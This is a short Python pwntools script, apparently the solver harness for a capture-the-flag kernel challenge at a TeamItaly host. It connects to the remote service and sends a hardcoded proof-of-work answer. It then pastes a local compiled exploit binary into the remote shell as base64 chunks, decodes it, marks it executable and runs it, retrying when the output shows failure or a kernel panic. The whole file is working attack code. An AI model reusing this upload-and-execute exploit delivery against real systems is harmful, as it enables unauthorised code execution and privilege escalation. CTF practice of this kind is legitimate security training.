#!/usr/bin/env python3
import os
import traceback

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "todo.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 1337))

with open(os.path.abspath(os.path.dirname(__file__)) + "/exploit", "rb") as f:
    expl = f.read()

explb64 = base64.b64encode(expl).decode()

maxattempts = 10
for i in range(maxattempts):
    try:
        print(f"[*] expl attempt {i + 1}/{maxattempts}")
        r = remote(HOST, PORT)

        hashcashpow = r.recvline().decode()
        assert ('hashcash -mb' in hashcashpow)
        r.sendline(b"whatabigmemelemao_131337")

        chunk_size = 76
        r.sendlineafter(b"~ $ ", b'echo """')
        for i in range(0, len(explb64), chunk_size):
            r.sendline(explb64[i:i + chunk_size].encode())
        r.sendline(b'""" > /jail/exploit.b64')

        print("[+] running expl...")
        r.recvuntil(b"~ $ ")
        r.sendline(
            f'base64 -d /jail/exploit.b64 > /jail/exploit && chmod +x /jail/exploit && /jail/exploit && exit'.encode(),
        )
        out = r.recvall(timeout=20).decode()

        if 'EXPLOIT FAILED' in out or 'Kernel panic' in out:
            print("[-] exploit failed")
            r.sendline(b"exit")
            r.close()
            continue

        print(out)
        sys.exit(0)
    except EOFError:
        traceback.print_exc()

sys.exit(1)
